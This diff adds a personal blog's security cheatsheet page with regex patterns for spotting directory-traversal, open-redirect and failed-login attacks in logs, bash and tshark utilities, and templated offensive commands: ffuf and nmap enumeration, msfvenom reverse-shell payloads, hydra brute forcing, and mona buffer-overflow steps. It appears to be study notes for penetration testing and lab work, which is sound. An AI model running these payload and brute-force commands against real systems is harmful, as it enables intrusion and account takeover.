@@ -1,0 +1,267 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Command Line Templates // Zach&#39;s Blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Zach Wong" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.a58e9bed6527e990a37775472f2144386fc6ece1b4392c32c803e3ce66b3543a.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Command Line Templates"/>
+<meta name="twitter:description" content=".toc { margin-top: 10px; display: inline-block; padding: 10px 10px 0 10px; background: #242930; } ul { margin-top: 0; padding-left: 25px; list-style-type: square; }   Content   Sublime Regex Baby  Find IP Addresses Find Flags Between { } Find Lines with Substring Detecting Open Redirect Attacks Detecting Directory Traversal Attacks (nginx) Regex to Detect Failed Logins (nginx) Detecting !DOCTYPE Regex Select Lines That Doesn’t Include Substring   Smash Bash  Base64 Decode a File Downloading Recursively with wget Downloading a Directory with wget yt-dlp (Downloading the best quality from a file) Examining ."/>
+
+    <meta property="og:title" content="Command Line Templates" />
+<meta property="og:description" content=".toc { margin-top: 10px; display: inline-block; padding: 10px 10px 0 10px; background: #242930; } ul { margin-top: 0; padding-left: 25px; list-style-type: square; }   Content   Sublime Regex Baby  Find IP Addresses Find Flags Between { } Find Lines with Substring Detecting Open Redirect Attacks Detecting Directory Traversal Attacks (nginx) Regex to Detect Failed Logins (nginx) Detecting !DOCTYPE Regex Select Lines That Doesn’t Include Substring   Smash Bash  Base64 Decode a File Downloading Recursively with wget Downloading a Directory with wget yt-dlp (Downloading the best quality from a file) Examining ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zachwong02.github.io/command-line-templates/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2024-01-01T10:48:18+08:00" />
+<meta property="article:modified_time" content="2024-01-01T10:48:18+08:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://zachwong02.github.io"><img class="app-header-avatar" src="/avatar.jpg" alt="Zach Wong" /></a>
+      <span class="app-header-title">Zach&#39;s Blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/command-line-templates/">Cheatsheet</a>
+      </nav>
+      <p>i&#39;m zach and I build labs</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/zachwong02" target="_blank" rel="noreferrer noopener me">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/zach-wong-zhi-zhen-a39724173" target="_blank" rel="noreferrer noopener me">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Command Line Templates</h1>
+    </header>
+    <div class="post-content">
+      <style>
+    .toc {
+        margin-top: 10px;
+        display: inline-block;
+        padding: 10px 10px 0 10px;
+        background: #242930;
+    }
+    ul {
+        margin-top: 0;
+        padding-left: 25px;
+        list-style-type: square;
+    }
+</style>
+
+<div class='toc'>
+    <b> Content </b>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sublime-regex-baby">Sublime Regex Baby</a>
+      <ul>
+        <li><a href="#find-ip-addresses">Find IP Addresses</a></li>
+        <li><a href="#find-flags-between--">Find Flags Between <code>{ }</code></a></li>
+        <li><a href="#find-lines-with-substring">Find Lines with Substring</a></li>
+        <li><a href="#detecting-open-redirect-attacks">Detecting Open Redirect Attacks</a></li>
+        <li><a href="#detecting-directory-traversal-attacks-nginx">Detecting Directory Traversal Attacks (nginx)</a></li>
+        <li><a href="#regex-to-detect-failed-logins-nginx">Regex to Detect Failed Logins (nginx)</a></li>
+        <li><a href="#detecting-doctype-regex">Detecting !DOCTYPE Regex</a></li>
+        <li><a href="#select-lines-that-doesnt-include-substring">Select Lines That Doesn’t Include Substring</a></li>
+      </ul>
+    </li>
+    <li><a href="#smash-bash">Smash Bash</a>
+      <ul>
+        <li><a href="#base64-decode-a-file">Base64 Decode a File</a></li>
+        <li><a href="#downloading-recursively-with-wget">Downloading Recursively with wget</a></li>
+        <li><a href="#downloading-a-directory-with-wget">Downloading a Directory with wget</a></li>
+        <li><a href="#yt-dlp-downloading-the-best-quality-from-a-file">yt-dlp (Downloading the best quality from a file)</a></li>
+        <li><a href="#examining-ds_store">Examining .DS_Store</a></li>
+        <li><a href="#replacing-string-with-sed">Replacing String with sed</a></li>
+        <li><a href="#removing-newline-characters">Removing Newline Characters</a></li>
+        <li><a href="#recursively-unzip">Recursively Unzip</a></li>
+        <li><a href="#concatenating-all-files-based-on-type">Concatenating All Files Based on Type</a></li>
+      </ul>
+    </li>
+    <li><a href="#networking">Networking</a>
+      <ul>
+        <li><a href="#extracting-dns-records-with-tshark">Extracting DNS records with tshark</a></li>
+        <li><a href="#extracting-destination-ports-based-on-source-port">Extracting Destination Ports Based on Source Port</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#recursive-directory-scanning-with-ffuf">Recursive Directory Scanning with ffuf</a></li>
+        <li><a href="#basic-network-scanning-with-nmap">Basic Network Scanning with nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#msfvenom-simple-windows-payload">msfvenom (Simple Windows Payload)</a></li>
+        <li><a href="#msfvenom-simple-windows-payload-shell">msfvenom (Simple Windows Payload Shell)</a></li>
+      </ul>
+    </li>
+    <li><a href="#brute-forcing">Brute Forcing</a>
+      <ul>
+        <li><a href="#service-brute-forcing-with-hydra">Service Brute Forcing with hydra</a></li>
+        <li><a href="#brute-forcing-forms-with-http-post-form">Brute Forcing Forms with http-post-form</a></li>
+        <li><a href="#brute-forcing-pop-up-login-page-with-hydra">Brute Forcing Pop Up Login Page with hydra</a></li>
+      </ul>
+    </li>
+    <li><a href="#windows-buffer-overflow">Windows Buffer Overflow</a>
+      <ul>
+        <li><a href="#finding-bad-characters-with-immunity-debugger">Finding Bad Characters with Immunity Debugger</a></li>
+        <li><a href="#finding-a-jump-point-with-immunity-debugger">Finding a Jump Point with Immunity Debugger</a></li>
+      </ul>
+    </li>
+    <li><a href="#miscellaneous">Miscellaneous</a>
+      <ul>
+        <li><a href="#connecting-to-pop3-with-ssl">Connecting to pop3 with SSL</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+
+<h2 id="sublime-regex-baby">Sublime Regex Baby</h2>
+<hr>
+<h3 id="find-ip-addresses">Find IP Addresses</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">\b(?:\d{1,3}\.){3}\d{1,3}\b
+</code></pre></div><h3 id="find-flags-between--">Find Flags Between <code>{ }</code></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">(?&lt;=\{)(.*?)(?=\})
+</code></pre></div><h3 id="find-lines-with-substring">Find Lines with Substring</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">.*\.com.*
+</code></pre></div><h3 id="detecting-open-redirect-attacks">Detecting Open Redirect Attacks</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/^.*&#34;GET.*\?.*=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.*HTTP\/.*&#34;.*$/gm
+</code></pre></div><h3 id="detecting-directory-traversal-attacks-nginx">Detecting Directory Traversal Attacks (nginx)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/^.*&#34;GET.*\?.*=(%2e%2e%2f).+?.*HTTP\/.*&#34;.*$/gm
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/^.*&#34;GET.*\?.*=(.+?(?=%2e%2e%2fetc%2f)).+?.*HTTP\/.*&#34;.*$/gm
+</code></pre></div><h3 id="regex-to-detect-failed-logins-nginx">Regex to Detect Failed Logins (nginx)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/^(\S+) \S+ \S+ \[.*?\] &#34;(POST|GET) \/login\.php.*?&#34; (401|403) \d+ &#34;.*?&#34; &#34;.*?&#34;/gm
+</code></pre></div><h3 id="detecting-doctype-regex">Detecting !DOCTYPE Regex</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">^(\S+) - (\S+) \[(.*?)\] &#34;(\S+) (.*?)\?(?=.*?\b21DOCTYPE\b).*? HTTP\/\d\.\d&#34; (\d+) (\d+) &#34;(.*?)&#34; &#34;(.*?)&#34;
+</code></pre></div><h3 id="select-lines-that-doesnt-include-substring">Select Lines That Doesn’t Include Substring</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">^(?!.*&lt;STRING&gt;).+$
+</code></pre></div><br>
+
+<h2 id="smash-bash">Smash Bash</h2>
+<hr>
+<h3 id="base64-decode-a-file">Base64 Decode a File</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -r line; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | base64 --decode; <span style="color:#66d9ef">done</span> &lt; file
+</code></pre></div><h3 id="downloading-recursively-with-wget">Downloading Recursively with wget</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">wget --recursive --no-parent &lt;WEBSITESITE&gt;
+</code></pre></div><h3 id="downloading-a-directory-with-wget">Downloading a Directory with wget</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">wget -r -np -nH --cut-dirs=3 -R index.html &lt;DIRECTORY&gt;
+
+</code></pre></div><h3 id="yt-dlp-downloading-the-best-quality-from-a-file">yt-dlp (Downloading the best quality from a file)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">yt-dlp  --merge-output-format mp4 -f &#34;bestvideo+bestaudio[ext=m4a]/best&#34; -a likes.txt
+
+</code></pre></div><h3 id="examining-ds_store">Examining .DS_Store</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xxd -p &lt;path/to/.DS_Store&gt; | sed <span style="color:#e6db74">&#39;s/00//g&#39;</span> | tr -d <span style="color:#e6db74">&#39;\\n&#39;</span> | sed <span style="color:#e6db74">&#39;s/\\([0-9A-F]\\{2\\}\\)/0x\\1 /g&#39;</span> | xxd -r -p | strings | sed <span style="color:#e6db74">&#39;s/ptb[LN]ustr//g&#39;</span>
+</code></pre></div><h3 id="replacing-string-with-sed">Replacing String with sed</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sed <span style="color:#e6db74">&#39;s/&lt;TARGET_STRING&gt;/&lt;REPLACE_STRING&gt;/g&#39;</span> &lt;FILE&gt;
+</code></pre></div><h3 id="removing-newline-characters">Removing Newline Characters</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tr -d <span style="color:#e6db74">&#34;\n\r&#34;</span> &lt; &lt;FILE&gt;
+</code></pre></div><h3 id="recursively-unzip">Recursively Unzip</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># There is always a format, identify it </span>
+format<span style="color:#f92672">=</span><span style="color:#ae81ff">2023</span>
+
+<span style="color:#66d9ef">while</span> true
+<span style="color:#66d9ef">do</span>
+	<span style="color:#75715e"># If it&#39;s a tar file use this </span>
+  <span style="color:#75715e"># tar -xvf file$format.tar</span>
+	unzip file$format.zip
+  
+	<span style="color:#75715e"># To decrease or increase  </span>
+	let <span style="color:#e6db74">&#34;format-=1&#34;</span>
+<span style="color:#66d9ef">done</span>
+</code></pre></div><h3 id="concatenating-all-files-based-on-type">Concatenating All Files Based on Type</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -name <span style="color:#e6db74">&#39;*.&lt;FILE_TYPE&gt;&#39;</span> -exec cat <span style="color:#f92672">{}</span> +
+</code></pre></div><br>
+
+<h2 id="networking">Networking</h2>
+<hr>
+<h3 id="extracting-dns-records-with-tshark">Extracting DNS records with tshark</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tshark -r &lt;PACKET_FILE&gt; -Tfields -e dns.qry.name -Y <span style="color:#e6db74">&#34;ip.src_host==&lt;IP_ADDRESS&gt;&#34;</span> &gt; &lt;TXT_FILE&gt;
+</code></pre></div><h3 id="extracting-destination-ports-based-on-source-port">Extracting Destination Ports Based on Source Port</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tshark -r &lt;PACKET_FILE&gt; -Y <span style="color:#e6db74">&#34;&lt;PROTOCOL&gt;.srcport == &lt;PORT&gt;&#34;</span> -T fields -e &lt;PROTOCOL&gt;.dstport &gt; ports.txt
+</code></pre></div><br>
+
+<h2 id="enumeration">Enumeration</h2>
+<hr>
+<h3 id="recursive-directory-scanning-with-ffuf">Recursive Directory Scanning with ffuf</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -w &lt;WORDLIST&gt; -u http://&lt;IP_ADDRESS&gt;/FUZZ -o &lt;OUTPUT_FILE&gt; --recursion -fc <span style="color:#ae81ff">403</span>
+</code></pre></div><h3 id="basic-network-scanning-with-nmap">Basic Network Scanning with nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV --oN &lt;OUTPUT_FILE&gt; -vv -Pn &lt;IP_ADDRESS&gt;
+</code></pre></div><br>
+
+<h2 id="exploitation">Exploitation</h2>
+<hr>
+<h3 id="msfvenom-simple-windows-payload">msfvenom (Simple Windows Payload)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LISTENING_IP_ADDRESS&gt; LPORT=&lt;LISTENING_PORT&gt; -f exe -e x86/shikata_ga_nai -o &lt;OUTPUT_FILE&gt;
+</code></pre></div><h3 id="msfvenom-simple-windows-payload-shell">msfvenom (Simple Windows Payload Shell)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -f py -b [bad characters]
+</code></pre></div><br>
+
+<h2 id="brute-forcing">Brute Forcing</h2>
+<hr>
+<h3 id="service-brute-forcing-with-hydra">Service Brute Forcing with hydra</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">hydra -v -l &lt;USERNAME&gt; -P &lt;PASSWORD&gt; -s &lt;PORT&gt; -f &lt;IP_ADDRESS&gt; &lt;SERVICE&gt; -V
+</code></pre></div><h3 id="brute-forcing-forms-with-http-post-form">Brute Forcing Forms with http-post-form</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">hydra -t 4 -V -l &lt;USERNAME&gt; -P &lt;PASSWORD_LIST&gt; &lt;IP_ADDRESS&gt; http-post-form &#34;&lt;DIRECTORY&gt;:&lt;RAW_POST_REQUEST&gt;:&lt;ERROR_MESSAGE&gt;&#34;
+</code></pre></div><h3 id="brute-forcing-pop-up-login-page-with-hydra">Brute Forcing Pop Up Login Page with hydra</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">hydra -l usernames.txt -P &lt;PASSWORD&gt; &lt;IP_ADDRESS&gt; http-get / -V
+</code></pre></div><br>
+
+<h2 id="windows-buffer-overflow">Windows Buffer Overflow</h2>
+<hr>
+<h3 id="finding-bad-characters-with-immunity-debugger">Finding Bad Characters with Immunity Debugger</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">!mona bytearray -b &#34;\\x00&#34;
+!mona compare -f &lt;binary file&gt; -a &lt;address&gt;
+</code></pre></div><h3 id="finding-a-jump-point-with-immunity-debugger">Finding a Jump Point with Immunity Debugger</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">!mona jmp -r esp -cpb [bad characters]
+</code></pre></div><br>
+
+<h2 id="miscellaneous">Miscellaneous</h2>
+<hr>
+<h3 id="connecting-to-pop3-with-ssl">Connecting to pop3 with SSL</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">openssl s_client -connect &lt;IP_ADDRESS&gt;:&lt;PORT&gt; -crlf -quiet
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
